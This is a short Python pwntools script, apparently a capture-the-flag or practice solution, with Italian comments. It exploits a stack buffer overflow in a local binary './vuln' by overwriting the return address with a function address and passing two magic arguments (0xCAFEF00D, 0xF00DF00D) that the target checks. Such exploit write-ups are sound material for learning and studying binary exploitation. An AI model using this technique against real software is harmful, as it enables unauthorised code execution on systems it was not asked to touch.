#!/usr/bin/env python3

from pwn import *

io = process('./vuln')

# print(io.recvuntil('string:'))
print(io.recvline())

payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBB'

# La funzione chiamata si aspettera' nello stack che ci sara' gia'
# rip, argomenti (indirizzi piu' alti questi!
# 000000
# ...
# rip 2
# arg1
# arg2
# ...
# kernel space

payload += p32(0x08049296)
payload += p32(0xFFFFFFFF)    # RIP successivo!
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

#   if (arg1 != 0xCAFEF00D)
#   if (arg2 != 0xF00DF00D)


io.sendline(payload)

print(io.recvline())
io.interactive()
